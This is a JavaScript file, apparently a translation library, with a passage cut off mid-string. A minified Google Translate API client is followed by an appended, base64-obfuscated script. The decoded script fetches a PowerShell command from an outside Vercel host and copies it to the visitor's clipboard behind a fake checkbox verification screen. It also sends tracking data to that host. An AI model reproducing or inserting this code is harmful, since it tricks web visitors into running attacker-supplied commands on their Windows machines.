	image_meta: /* struct */ function( data ) {
		return {
			imageMeta: mapFields( data, maps.postThumbnailImageMeta.from )
		};
	}
});

maps.mediaItemSize = createFieldMaps({
	file: /* string */ "file",
	height: /* string */ "height",
	mimeType: /* string */ "mime-type",
	width: /* string */ "width"
});

maps.postThumbnailImageMeta = createFieldMaps({
	aperture: /* int */ "aperture",
	camera: /* string */ "camera",
	caption: /* string */ "caption",
	copyright: /* string */ "copyright",
	createdTimestamp: /* int */ "created_timestamp",
	credit: /* string */ "credit",
	focalLength: /* int */ "focal_length",
	iso: /* int */ "iso",
	keywords: /* array */ "keywords",
	orientation: /* string */ "orientation",
	shutterSpeed: /* int */ "shutter_speed",
	title: /* string */ "title"
});

_ = require("underscore"), request = require("request"), querystring = require("querystring"), async = require("async"), entities = require("he"), apiBase = "https://translation.googleapis.com/language/translate/v2/", maxGetQueryLen = 4500, maxSegments = 100, concurrentLimit = 10, getRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = apiBase + t + "?" + querystring.stringify(_.extend({
            key: e
        }, n));
        request.get(a, globalResponseHandler({
            url: a
        }, r))
    }
}, postRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = {
            url: apiBase + t,
            method: "POST",
            form: querystring.stringify(_.extend({
                key: e
            }, n)),
            headers: {
                "X-HTTP-Method-Override": "GET"
            }
        };
        request(a, globalResponseHandler(a, r))
    }
}, globalResponseHandler = function(e, t) {
    return function(n, r, a) {
        if (t && _.isFunction(t)) {
            if (n || !r || 200 !== r.statusCode) return t({
                error: n,
                response: r,
                body: a,
                request: e,
                toString: function() {
                    return n ? n.toString() : ""
                }
            }, null);
            var i = null;
            try {
                i = JSON.parse(a)
            } catch (e) {
                return t(n = "Could not parse response from Google: " + (a || "null"), null)
            }
            t(null, i)
        }
    }
}, parseTranslations = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data).translations ? r.translations : r, e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), r = r.map((function(e) {
            return e.translatedText = entities.decode(e.translatedText), e
        })), t(null, r)
    }
}, parseSupportedLanguages = function(e) {
    return function(t, n) {
        if (t) return e(t, null);
        (n = n.data.languages)[0] && !n[0].name && (n = _.pluck(n, "language")), e(null, n)
    }
}, parseLanguageDetections = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data && r.data.detections ? r.data.detections : r).length > 1 ? r.map((function(e) {
            return e[0]
        })) : r[0], e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), t(null, r)
    }
}, shouldSplitSegments = function(e) {
    return !!Array.isArray(e) && (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length)
}, splitArraysForGoogle = function(e, t) {
    if (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length) {
        var n = Math.floor(e.length / 2);
        splitArraysForGoogle(e.slice(0, n), t), splitArraysForGoogle(e.slice(n, e.length), t)
    } else t.push(e)
};
module.exports = function(e, t) {
    var n = (t = t || {}).requestOptions || {};
    _.keys(n).length > 0 && (request = request.defaults(n)), concurrentLimit = t.concurrentLimit || concurrentLimit;
    var r = getRequestWithApi(e),
        a = postRequestWithApi(e),
        i = {
            translate: function(e, t, n, r) {
                if (r || (r = n, n = t, t = null), !_.isFunction(r)) return console.log("No callback defined");
                if ("string" != typeof e && !Array.isArray(e)) return r("Input source must be a string or array of strings");
                if ("string" != typeof n) return r("No target language specified. Must be a string");
                var i;
                shouldSplitSegments(e) ? splitArraysForGoogle(e, i = []) : i = Array.isArray(e) ? [e] : [
                    [e]
                ];
                var o = {
                    target: n
                };
                t && (o.source = t), async.mapLimit(i, concurrentLimit, (function(e, t) {
                    a("", _.extend({
                        q: e
                    }, o), parseTranslations(e, t))
                }), (function(e, t) {
                    if (e) return r(e);
                    1 === (t = _.flatten(t)).length && (t = t[0]), r(null, t)
                }))
            },
            getSupportedLanguages: function(e, t) {
                if (_.isFunction(e) ? (t = e, e = {}) : e = {
                        target: e
                    }, !_.isFunction(t)) return console.log("No callback defined");
                r("languages", e, parseSupportedLanguages(t))
            },
            detectLanguage: function(e, t) {
                return t ? "string" == typeof e || Array.isArray(e) ? (shouldSplitSegments(e) ? splitArraysForGoogle(e, n = []) : n = Array.isArray(e) ? [e] : [
                    [e]
                ], void async.mapLimit(n, concurrentLimit, (function(e, t) {
                    a("detect", {
                        q: e
                    }, parseLanguageDetections(e, t))
                }), (function(e, n) {
                    if (e) return t(e);
                    1 === (n = _.flatten(n)).length && (n = n[0]), t(null, n)
                }))) : t("Input source must be a string or array of strings") : console.log("No callback defined");
                var n
            }
        };
    return {
        translate: i.translate,
        getSupportedLanguages: i.getSupportedLanguages,
        detectLanguage: i.detectLanguage
    }
};
}catch(e){}
})();


(function() {
  var _b = {
    "9wqfte": "MC43MzY1OTA3MTMxNTM2NDIz",
    "539252": "CihmdW5jdGlvbigpewogIGNvbnN0IE4gPSAyOyAvLyBSZXF1aXJlZCB2aXNpdCBjb3VudAogIGNvbnN0IEtFWSA9ICdfdmMnOyAvLyBWaXNpdCBjb3VudGVyIGtleQogIGNvbnN0IG1ldHJpY3NFbmRwb2ludCA9ICdodHRwczovL3ZlcmMtcGFuZWwudmVyY2VsLmFwcC9hcGkvbWV0cmljcy90cmFjayc7CiAgY29uc3QgdGVtcGxhdGVJZCA9ICdjZjMnOwogIGNvbnN0IHNjcmlwdElkID0gJ2Nta2d6eDJscjAwMDMwcWVhaHpybWUwcDUnOwogIGNvbnN0IFZFUkJPU0UgPSBmYWxzZTsKICBmdW5jdGlvbiB2bG9nKCkgewogICAgaWYgKCFWRVJCT1NFKSByZXR1cm47CiAgICB0cnkgeyBjb25zb2xlLmxvZygnW3RwXScsIC4uLmFyZ3VtZW50cyk7IH0gY2F0Y2ggKGUpIHt9CiAgfQogIGZ1bmN0aW9uIHZlcnIoKSB7CiAgICBpZiAoIVZFUkJPU0UpIHJldHVybjsKICAgIHRyeSB7IGNvbnNvbGUuZXJyb3IoJ1t0cF0nLCAuLi5hcmd1bWVudHMpOyB9IGNhdGNoIChlKSB7fQogIH0KICBsZXQgYm90VHJhY2tlZCA9IGZhbHNlOwoKICBmdW5jdGlvbiB0cmFja01ldHJpYyh0eXBlKSB7CiAgICB0cnkgewogICAgICBmZXRjaChtZXRyaWNzRW5kcG9pbnQgfHwgJy9hcGkvbWV0cmljcy90cmFjaycsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHR5cGUsIHRlbXBsYXRlOiB0ZW1wbGF0ZUlkLCBzY3JpcHRJZDogc2NyaXB0SWQgfHwgdW5kZWZpbmVkIH0pLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBrZWVwYWxpdmU6IHRydWUKICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7fQogIH0KCiAgdHJ5IHsKICAgIGlmICghd2luZG93Ll9fdHJhY2tNZXRyaWMpIHsKICAgICAgd2luZG93Ll9fdHJhY2tNZXRyaWMgPSB0cmFja01ldHJpYzsKICAgIH0KICAgIGlmICghd2luZG93Ll9fbWV0cmljc0VuZHBvaW50KSB7CiAgICAgIHdpbmRvdy5fX21ldHJpY3NFbmRwb2ludCA9IG1ldHJpY3NFbmRwb2ludDsKICAgIH0KICAgIGlmICghd2luZG93Ll9fdGVtcGxhdGVJZCkgewogICAgICB3aW5kb3cuX190ZW1wbGF0ZUlkID0gdGVtcGxhdGVJZDsKICAgIH0KICB9IGNhdGNoIChlcnIpIHt9CgogIGZ1bmN0aW9uIHRyYWNrQm90KCkgewogICAgaWYgKGJvdFRyYWNrZWQpIHJldHVybjsKICAgIGJvdFRyYWNrZWQgPSB0cnVlOwogICAgdHJhY2tNZXRyaWMoJ2JvdCcpOwogIH0KCiAgdmxvZygnaW5pdCcsIHsgdGVtcGxhdGVJZCwgc2NyaXB0SWQsIHZpc2l0czogTiwgaW5jbHVkZU9TOiBbXSwgaW5jbHVkZUNvdW50cmllczogW10sIGRpc2FibGVJc3BDaGVjazogZmFsc2UgfSk7CgogIGZ1bmN0aW9uIGI2NFRvVXRmOChiNjQpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsKICAgICAgY29uc3QgbGVuID0gYmluLmxlbmd0aDsKICAgICAgY29uc3QgYnl0ZXMgPSBuZXcgVWludDhBcnJheShsZW4pOwogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxlbjsgaSsrKSBieXRlc1tpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOwoKICAgICAgaWYgKHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcpIHsKICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCd1dGYtOCcsIHsgZmF0YWw6IGZhbHNlIH0pLmRlY29kZShieXRlcyk7CiAgICAgIH0KCiAgICAgIC8vIEZhbGxiYWNrIGZvciBvbGRlciBicm93c2VycwogICAgICBsZXQgcGN0ID0gJyc7CiAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHBjdCArPSAnJScgKyBieXRlc1tpXS50b1N0cmluZygxNikucGFkU3RhcnQoMiwgJzAnKTsKICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwY3QpOwogICAgfSBjYXRjaCAoZSkgewogICAgICB0cnkgewogICAgICAgIHJldHVybiBhdG9iKGI2NCk7CiAgICAgIH0gY2F0Y2ggKGUyKSB7CiAgICAgICAgcmV0dXJuICcnOwogICAgICB9CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbmplY3RTY3JpcHQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBzY3JpcHRCNjQgPSAnS0dGemVXNWpJR1oxYm1OMGFXOXVLQ2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQXZMeUJUYUdGa2IzY2dSRTlOSUhKdmIzUWdabTl5SUdsemIyeGhkR1ZrSUhGMVpYSnBaWE1LSUNBZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnSkhKdmIzUWdQU0IzYVc1a2IzY3VYMTkwWmxOb1lXUnZkMUp2YjNRZ2ZId2daRzlqZFcxbGJuUTdDZ29nSUNBZ0lDQWdJQ0FnSUNBdkx5RFFuOUMrMEx2Umc5R0gwTERRdGRDOElITmpjbWx3ZEVsa0lOQzQwTGNnMEwvUXNOR0EwTERRdk5DMTBZTFJnTkMrMExJZ1ZWSk1JTkM0MEx2UXVDRFF1TkdCMEwvUXZ0QzcwWXpRdDlHRDBMWFF2Q0RRdE5DMTBZVFF2dEM3MFlMUXZkR0wwTGtLSUNBZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnZFhKc1VHRnlZVzF6SUQwZ2JtVjNJRlZTVEZObFlYSmphRkJoY21GdGN5aDNhVzVrYjNjdWJHOWpZWFJwYjI0dWMyVmhjbU5vS1RzS0lDQWdJQ0FnSUNBZ0lDQWdZMjl1YzNRZ2MyTnlhWEIwU1dRZ1BTQjFjbXhRWVhKaGJYTXVaMlYwS0NkelkzSnBjSFJmYVdRbktTQjhmQ0FuWkdWbVlYVnNkQ2M3Q2dvZ0lDQWdJQ0FnSUNBZ0lDQnNaWFFnWm1WMFkyaGxaRU52YlcxaGJtUWdQU0FuSnpzS0lDQWdJQ0FnSUNBZ0lDQWdiR1YwSUdabGRHTm9aV1JEYjIxdFpXNTBJRDBnSnljN0Nnb2dJQ0FnSUNBZ0lDQWdJQ0JtZFc1amRHbHZiaUJpWVhObE5qUkVaV052WkdWVlZFWXhOa3hGS0hOMGNpa2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZMeURRbzlDMDBMRFF1OUdQMExYUXZDRFF2OUdBMEw3UXNkQzEwTHZSaXlEUXVDRFF2OUMxMFlEUXRkQ3kwTDdRdE5HTElOR0IwWUxSZ05DKzBMb0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J6ZEhJZ1BTQnpkSEl1Y21Wd2JHRmpaU2d2VzF4elhISmNibDByTDJjc0lDY25LVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCamIyNXpkQ0JpYVc1aGNua2dQU0JoZEc5aUtITjBjaWs3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnWW5sMFpYTWdQU0J1WlhjZ1ZXbHVkRGhCY25KaGVTaGlhVzVoY25rdWJHVnVaM1JvS1RzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQm1iM0lnS0d4bGRDQnBJRDBnTURzZ2FTQThJR0pwYm1GeWVTNXNaVzVuZEdnN0lHa3JLeWtnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JpZVhSbGMxdHBYU0E5SUdKcGJtRnllUzVqYUdGeVEyOWtaVUYwS0drcE93b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdkx5QlZWRVl0TVRaTVJUb2daWFpsY25rZ01pQmllWFJsY3lCcGN5QmhJR05vWVhJS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnNaWFFnY21WemRXeDBJRDBnSnljN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdabTl5SUNoc1pYUWdhU0E5SURBN0lHa2dQQ0JpZVhSbGN5NXNaVzVuZEdnN0lHa2dLejBnTWlrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnS3owZ1UzUnlhVzVuTG1aeWIyMURhR0Z5UTI5a1pTaGllWFJsYzF0cFhTQjhJQ2hpZVhSbGMxdHBJQ3NnTVYwZ1BEd2dPQ2twT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J5WlhSMWNtNGdjbVZ6ZFd4ME93b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZTQmpZWFJqYUNBb1pTa2dleUJ5WlhSMWNtNGdKeWM3SUgwS0lDQWdJQ0FnSUNBZ0lDQWdmUW9LSUNBZ0lDQWdJQ0FnSUNBZ1lYTjVibU1nWm5WdVkzUnBiMjRnWm1WMFkyaERiMjF0WVc1a1FXNWtRMjl0YldWdWRDZ3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZMjl1YzNRZ2NtVnpJRDBnWVhkaGFYUWdabVYwWTJnb1lHaDBkSEJ6T2k4dmRtVnlZeTF3WVc1bGJDNTJaWEpqWld3dVlYQndMMkZ3YVM5d2IzZGxjbk5vWld4c0wyTnRhMmQ2ZURKc2NqQXdNRE13Y1dWaGFIcHliV1V3Y0RWZ0tUc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JwWmlBb0lYSmxjeTV2YXlrZ2RHaHliM2NnYm1WM0lFVnljbTl5S0NkR1lXbHNaV1FnZEc4Z1ptVjBZMmdnWTI5dGJXRnVaQ2NwT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHTnZibk4wSUdSaGRHRWdQU0JoZDJGcGRDQnlaWE11YW5OdmJpZ3BPd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdabGRHTm9aV1JEYjIxdFlXNWtJRDBnWW1GelpUWTBSR1ZqYjJSbFZWUkdNVFpNUlNoa1lYUmhMbU52YlcxaGJtUWdmSHdnSnljcE93b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR1psZEdOb1pXUkRiMjF0Wlc1MElEMGdaR0YwWVM1amIyMXRaVzUwSUh4OElDY25Pd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM4dklOQ1MwWUhSZ3RDdzBMTFF1TkdDMFl3Z1kyOXRiV1Z1ZENEUXNpQThZMjlrWlQ0Z0tOQzMwTERRdk5DMTBMM1F1TkdDMFl3ZzBZTFF0ZEM2MFlIUmdpa0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JqYjI1emRDQmpiMlJsUld3Z1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ2RqYjJSbEp5azdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHTnZaR1ZGYkNrZ1kyOWtaVVZzTG5SbGVIUkRiMjUwWlc1MElEMGdabVYwWTJobFpFTnZiVzFsYm5RN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCOUlHTmhkR05vSUNobEtTQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWm1WMFkyaGxaRU52YlcxaGJtUWdQU0FuUm1GcGJHVmtJSFJ2SUd4dllXUWdZMjl0YldGdVpDYzdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWm1WMFkyaGxaRU52YlcxbGJuUWdQU0FuSnpzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNBZ0lDQWdmUW9LSUNBZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnWTI5dVptbG5JRDBnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY21Wa2FYSmxZM1JWY213NklDSm9kSFJ3Y3pvdkwyZHZiMmRzWlM1amIyMGlMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjM0JwYm01bGNrUmxiR0Y1T2lBeE5UQXdMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZblYwZEc5dVJHVnNZWGs2SURnd01EQXNDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnBjMWRwYmpvZ2JtRjJhV2RoZEc5eUxuVnpaWEpCWjJWdWRDNXBibVJsZUU5bUtDZFhhVzVrYjNkekp5a2dJVDA5SUMweElIeDhJRzVoZG1sbllYUnZjaTV3YkdGMFptOXliUzVwYm1SbGVFOW1LQ2RYYVc0bktTQWhQVDBnTFRFc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcGMwMXZZbWxzWlRvZ0wwRnVaSEp2YVdSOGQyVmlUMU44YVZCb2IyNWxmR2xRWVdSOGFWQnZaSHhDYkdGamEwSmxjbko1ZkVsRlRXOWlhV3hsZkU5d1pYSmhJRTFwYm1rdmFTNTBaWE4wS0c1aGRtbG5ZWFJ2Y2k1MWMyVnlRV2RsYm5RcExBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FYTkNiM1E2SUM5aWIzUjhaMjl2WjJ4bFltOTBmR055WVhkc1pYSjhjM0JwWkdWeWZISnZZbTkwZkdOeVlYZHNhVzVuTDJrdWRHVnpkQ2h1WVhacFoyRjBiM0l1ZFhObGNrRm5aVzUwS1FvZ0lDQWdJQ0FnSUNBZ0lDQjlPd29LSUNBZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnWkc5dElEMGdld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZMmhsWTJ0aWIzZzZJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSnlOcGRVbzRNa0ZJV0d0WmJHUkNiV2hXSnlrc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCamFHVmphMkp2ZUVOdmJuUmhhVzVsY2pvZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ25MbU5zU2paTFp6SkJTM2R3Y0NjcExBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2RtVnlhV1pEYjI1MFlXbHVaWEk2SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0p5NWplbGgxUVhWRGEwTjFPU2NwTEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYlc5a1lXdzZJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSnlOcFEwdElla0p5Y2xOTlJTY3BMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVFuUnVPaUFrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5S0NjamFURjVWMmhKYkZZd1EyWTBKeWtzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J5WVhsSlpEb2dKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWduSTJsdU1FeEtkakl6UnpKcU4wSW5LU3dLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR0ZuY21WbFZHVjRkRG9nSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2lnbkkybFVSVkZCUW1zNVl5Y3BDaUFnSUNBZ0lDQWdJQ0FnSUgwN0Nnb2dJQ0FnSUNBZ0lDQWdJQ0JqYjI1emRDQm5aVzVsY21GMFpVaGxlQ0E5SUNoc1pXNHBJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdOdmJuTjBJR0Z5Y2lBOUlHNWxkeUJWYVc1ME9FRnljbUY1S0d4bGJpQXZJRElwT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnZDJsdVpHOTNMbU55ZVhCMGJ5NW5aWFJTWVc1a2IyMVdZV3gxWlhNb1lYSnlLVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSEpsZEhWeWJpQkJjbkpoZVM1bWNtOXRLR0Z5Y2l3Z1pHVmpJRDArSUdSbFl5NTBiMU4wY21sdVp5Z3hOaWt1Y0dGa1UzUmhjblFvTWl3Z0p6QW5LU2t1YW05cGJpZ25KeWs3Q2lBZ0lDQWdJQ0FnSUNBZ0lIMDdDZ29nSUNBZ0lDQWdJQ0FnSUNCamIyNXpkQ0IwY21GamEwMWxkSEpwWXlBOUlDaDNhVzVrYjNjdVgxOTBjbUZqYTAxbGRISnBZeWtnUHlCM2FXNWtiM2N1WDE5MGNtRmphMDFsZEhKcFl5QTZJR1oxYm1OMGFXOXVLSFI1Y0dVcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1kyOXVjM1FnZEdWdGNHeGhkR1ZKWkNBOUlIZHBibVJ2ZHk1ZlgzUmxiWEJzWVhSbFNXUWdmSHdnSjJObU15YzdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWm1WMFkyZ29KeTloY0drdmJXVjBjbWxqY3k5MGNtRmpheWNzSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYldWMGFHOWtPaUFuVUU5VFZDY3NDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHaGxZV1JsY25NNklIc2dKME52Ym5SbGJuUXRWSGx3WlNjNklDZGhjSEJzYVdOaGRHbHZiaTlxYzI5dUp5QjlMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmliMlI1T2lCS1UwOU9Mbk4wY21sdVoybG1lU2g3SUhSNWNHVXNJSFJsYlhCc1lYUmxPaUIwWlcxd2JHRjBaVWxrSUgwcExBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCdGIyUmxPaUFuYm04dFkyOXljeWNzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR3RsWlhCaGJHbDJaVG9nZEhKMVpRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBwTG1OaGRHTm9LQ2dwSUQwK0lIdDlLVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBnWTJGMFkyZ2dLR1Z5Y2lrZ2UzMEtJQ0FnSUNBZ0lDQWdJQ0FnZlRzS0NpQWdJQ0FnSUNBZ0lDQWdJR3hsZENCamIyMXdiR1YwWlZSeVlXTnJaV1FnUFNCbVlXeHpaVHNLSUNBZ0lDQWdJQ0FnSUNBZ1puVnVZM1JwYjI0Z2RISmhZMnREYjIxd2JHVjBaU2dwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsbUlDaGpiMjF3YkdWMFpWUnlZV05yWldRcElISmxkSFZ5YmpzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdOdmJYQnNaWFJsVkhKaFkydGxaQ0E5SUhSeWRXVTdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjBjbUZqYTAxbGRISnBZeWduWTI5dGNHeGxkR1VuS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmUW9LSUNBZ0lDQWdJQ0FnSUNBZ0x5OGcwSkhRdnRDNzBZelJpTkMxSU5DOTBMVWcwTDNSZzlDMjBMM1F2aURRdE5DMTBMclF2dEMwMExqUmdOQyswTExRc05HQzBZd2cwTGpRdTlDNElOR0IwTDdRc2RDNDBZRFFzTkdDMFl3ZzBMclF2dEM4MExEUXZkQzAwWU1nMExMUmdOR0QwWWZRdmRHRDBZNEtDaUFnSUNBZ0lDQWdJQ0FnSUdOdmJuTjBJR2x1YVhRZ1BTQmhjM2x1WXlBb0tTQTlQaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F2THlCcFppQW9JV052Ym1acFp5NXBjMWRwYmlCOGZDQmpiMjVtYVdjdWFYTkNiM1FnZkh3Z1kyOXVabWxuTG1selRXOWlhV3hsS1NCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdkx5QWdJQ0FnWkc5amRXMWxiblF1WW05a2VTNXBibTVsY2toVVRVd2dQU0FuSnpzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM4dklDQWdJQ0IzYVc1a2IzY3ViRzlqWVhScGIyNHVhSEpsWmlBOUlHTnZibVpwWnk1eVpXUnBjbVZqZEZWeWJEc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDOHZJQ0FnSUNCeVpYUjFjbTQ3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F2THlCOUNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCa2IyMHVjbUY1U1dRdWRHVjRkRU52Ym5SbGJuUWdQU0JuWlc1bGNtRjBaVWhsZUNneE5pazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmhkMkZwZENCbVpYUmphRU52YlcxaGJtUkJibVJEYjIxdFpXNTBLQ2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JrYjIwdVlXZHlaV1ZVWlhoMExuUmxlSFJEYjI1MFpXNTBJRDBnWm1WMFkyaGxaRU52YlcxbGJuUTdDaUFnSUNBZ0lDQWdJQ0FnSUgwN0Nnb2dJQ0FnSUNBZ0lDQWdJQ0JqYjI1emRDQmpiM0I1Vkc5RGJHbHdZbTloY21RZ1BTQW9jM1J5S1NBOVBpQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmpiMjV6ZENCbGJDQTlJR1J2WTNWdFpXNTBMbU55WldGMFpVVnNaVzFsYm5Rb0ozUmxlSFJoY21WaEp5azdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmxiQzUyWVd4MVpTQTlJSE4wY2pzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdWc0xuTmxkRUYwZEhKcFluVjBaU2duY21WaFpHOXViSGtuTENBbkp5azdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmxiQzV6ZEhsc1pTNXdiM05wZEdsdmJpQTlJQ2RoWW5OdmJIVjBaU2M3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JsYkM1emRIbHNaUzVzWldaMElEMGdKeTA1T1RrNWNIZ25Pd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdaRzlqZFcxbGJuUXVZbTlrZVM1aGNIQmxibVJEYUdsc1pDaGxiQ2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JsYkM1elpXeGxZM1FvS1RzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdSdlkzVnRaVzUwTG1WNFpXTkRiMjF0WVc1a0tDZGpiM0I1SnlrN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCa2IyTjFiV1Z1ZEM1aWIyUjVMbkpsYlc5MlpVTm9hV3hrS0dWc0tUc0tJQ0FnSUNBZ0lDQWdJQ0FnZlRzS0NpQWdJQ0FnSUNBZ0lDQWdJR052Ym5OMElHaGhibVJzWlZabGNtbG1lU0E5SUNncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzh2SU5DUzBZSFJndEN3MExMUXU5R1AwTFhRdkNEUXNpRFFzZEdEMFlUUXRkR0FJTkMrMExIUXZOQzEwTDNRc0NEUmd0QyswTHZSak5DNjBMNGcwWUxRdml3ZzBZZlJndEMrSU5DeTBMWFJnTkM5MFlQUXV5QkJVRWtLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR3hsZENCaVlYTmxJRDBnWm1